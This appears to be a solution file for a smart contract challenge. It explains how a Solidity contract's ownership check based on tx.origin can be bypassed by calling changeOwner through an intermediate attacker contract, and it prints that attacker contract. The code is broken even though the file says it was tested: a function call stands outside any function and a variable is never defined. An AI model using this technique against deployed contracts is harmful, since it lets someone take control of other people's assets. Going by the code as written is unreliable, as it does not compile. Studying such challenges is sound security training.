/*

This example underlines the difference between tx.origin and msg.sender

-- tx.origin => refers to the externally owned address from where the transaction originated

-- msg.sender => refers to the immediately preceding address (contract or EOA) from where the transaction was received

Hence to become the owner we need to send the transaction from another address and pass our own address (EOA) as the parameter to changeOwner function

*/

// Get the address of the contract instance from your console
contract.address;
// Use this addr to populate addr field in the solidity code


// === Solidity Code
// Deployed and Tested using Remix
// Run the TelephoneOwner contract

/*

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneOwner {

  Telephone t;
  address tt = addr; // Obtained from console

  constructor() {
    t = Telephone(tt);
  }

  t.changeOwner(msg.sender);

}

*/
